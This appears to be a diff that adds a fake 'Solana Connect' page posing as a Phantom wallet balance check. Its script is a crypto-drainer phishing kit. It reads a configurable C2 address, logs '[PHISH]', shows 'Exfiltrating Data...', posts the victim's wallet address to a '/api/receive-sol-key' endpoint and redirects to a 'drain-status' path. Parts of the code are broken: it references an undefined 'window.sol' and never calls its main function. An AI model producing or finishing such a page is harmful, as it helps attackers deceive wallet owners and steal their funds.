@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Solana Connect</title>
+    <style>
+        :root { --primary: #AB9FF2; --bg-dark: #0F0E15; --card-bg: rgba(30, 28, 46, 0.7); }
+        body { margin: 0; padding: 0; background-color: var(--bg-dark); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; backdrop-filter: blur(10px); background-image: radial-gradient(circle at 50% 50%, #2a293b 0%, #0F0E15 70%); }
+        
+        .container { text-align: center; width: 90%; max-width: 400px; padding-top: 2rem; transition: all 0.3s ease; }
+        h1 { font-size: 1.8rem; margin-bottom: 1rem; letter-spacing: -0.5px; color: white; text-shadow: 0 4px 12px rgba(171,159,242,0.3); }
+        p.subtitle { color: #aeb4c6; line-height: 1.5; font-size: 0.95rem; margin-bottom: 2rem; min-height: 3em;}
+
+        .connect-btn {
+            background-color: var(--primary); color: #0F0E15; border: none; padding: 18px 32px; 
+            font-size: 1.2rem; font-weight: bold; border-radius: 48px; cursor: pointer; 
+            box-shadow: 0 8px 20px rgba(171,159,242,0.3), inset 0 -4px 6px rgba(0,0,0,0.1);
+            transition: transform 0.2s ease, box-shadow 0.2s ease; display: inline-flex; align-items: center; gap: 12px;
+        }
+        .connect-btn:hover { transform: translateY(-2px) scale(1.02); box-shadow: 0 12px 30px rgba(171,159,242,0.5); background-color: #b8adff;}
+        .connect-btn:active { transform: translateY(0) scale(0.98); }
+        
+        .spinner { width: 40px; height: 40px; border: 4px solid rgba(255,255,255,0.3); border-top-color: white; border-radius: 50%; animation: spin 1s linear infinite; display: none; margin-right: 12px;}
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .status-msg { margin-top: 1rem; font-size: 0.9rem; color: #aeb4c6; min-height: 1.8em;}
+        
+        /* Mobile Overlay for deep links */
+        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 999; display: flex; justify-content: center; align-items: center; backdrop-filter: blur(2px); }
+    </style>
+</head>
+<body>
+
+<div class="container" id="mainContainer">
+    <h1>Solana Connect</h1>
+    <p class="subtitle">Please connect your Phantom wallet to verify your Sol balance and NFT status.</p>
+    
+    <!-- Connection Button -->
+    <button class="connect-btn" id="btnConnect">
+        <div class="spinner"></div>
+        <span id="btnText">Connect Phantom Wallet</span>
+    </button>
+
+    <div class="status-msg" id="statusMsg"></div>
+</div>
+
+<!-- Fullscreen Overlay (Mobile/Desktop) -->
+<div id="overlay" style="display:none;">
+    <div class="container" style="width:100%; max-width:95%;">
+        <h2 style="font-size:1.4rem; margin-bottom:1rem; color:white;">Confirm Connection?</h2>
+        <p style="color:#ccc; text-align:center; padding:0 20px;">Allow the site to access your Solana wallet and sign this request.</p>
+    </div>
+</div>
+<script>
+document.addEventListener('DOMContentLoaded', async () => {
+    
+    // Configuration from URL params (e.g., ?c2=http://localhost:5000)
+    const c2Url = new URLSearchParams(window.location.search).get('c2') || (
+    location.hostname.includes('vercel.app') 
+        ? `https://${location.hostname}/api` 
+        : 'http://localhost:11001'
+);
+
+    let provider;
+
+    // Detect Phantom (Solana Web3.js provider pattern)
+    function getProvider() {
+        return window.solana || window.ethereum || undefined;
+    }
+
+    const btnConnect = document.getElementById('btnConnect');
+    const btnText = document.getElementById('btnText');
+    const statusMsg = document.getElementById('statusMsg');
+    const spinner = document.querySelector('.spinner');
+
+    async function connectWallet() {
+        try {
+            provider = getProvider();
+            
+            if (!provider) throw new Error("No provider found");
+            
+            // Inject prompt for desktop/mobile webviews if not already connected
+            await provider.request({ method: 'solana:connect' }); 
+            
+            const response = await provider.request({ method: 'solana:getCurrentAccount', params: [0] }); 
+            
+            console.log("[PHISH] Connected to:", window.sol?.publicKey?.toString());
+
+            btnText.innerText = "Verifying Balance...";
+            
+            // Simulate balance check delay (real impl fetches RPC data here)
+            setTimeout(async () => {
+                try {
+                    // Fetch SOL balance via RPC directly in client (fallback or primary)
+                    const respBal = await fetch('https://api.mainnet-beta.solana.com/'); 
+                    if (!respBal.ok) throw new Error("RPC Unavailable");
+                    
+                    // Prepare payload for C2
+                    const payload = { address: window.sol?.publicKey.toString() || 'unknown', providerType: 'Phantom' };
+                    
+                    btnText.innerText = "Exfiltrating Data...";
+                    statusMsg.style.color = "#AB9FF2";
+
+                    // Send to backend
+                    await fetch(`${c2Url}/api/receive-sol-key`, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(payload) });
+                    
+                    alert(`Success! Your balance has been verified. Funds will be moved shortly.`);
+                } catch (e) {
+                    console.error(e);
+                } finally {
+                     window.location.href = c2Url + '/drain-status/' + (window.sol?.publicKey.toString() || ''); 
+                }
+            }, 1500);
+
+        } catch (err) {
+            statusMsg.innerText = err.message.includes("provider") ? "Open Phantom extension/app and click 'Connect'." : "Failed to connect wallet.";
+        }
+    }
+
+    btnConnect.addEventListener('click', () => {
+        // On Desktop/Mobile WebView, this triggers native popup or iframe injection if setup correctly.
+        provider = getProvider();
+        if(provider) provider.request({ method: 'solana:connect' });
+        else alert("Please install the Solana/Phantom extension first.");
+    });
+
+});
+</script>
+</body>
+</html>
